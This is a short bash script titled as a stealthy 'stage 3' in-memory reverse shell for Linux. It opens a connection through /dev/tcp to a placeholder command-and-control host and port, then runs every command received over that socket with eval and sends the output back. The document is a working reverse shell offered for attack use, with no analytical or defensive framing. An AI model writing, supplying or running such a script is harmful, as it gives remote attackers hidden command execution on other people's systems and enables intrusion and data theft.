#!/bin/bash
# Stage 3 — In-Memory Reverse Shell for Linux (Stealth 2025 Edition)

HOST="REPLACE_IP"
PORT=REPLACE_PORT

# Connect to C2 and read/execute commands in memory
exec 5<>/dev/tcp/$HOST/$PORT || exit 1
echo -n "$USER@$(hostname):~$ " >&5

while read -r cmd <&5; do
  [[ "$cmd" == "exit" ]] && break
  out="$(eval "$cmd" 2>&1)"
  echo "$out" >&5
  echo -n "$USER@$(hostname):~$ " >&5
done

exec 5>&-
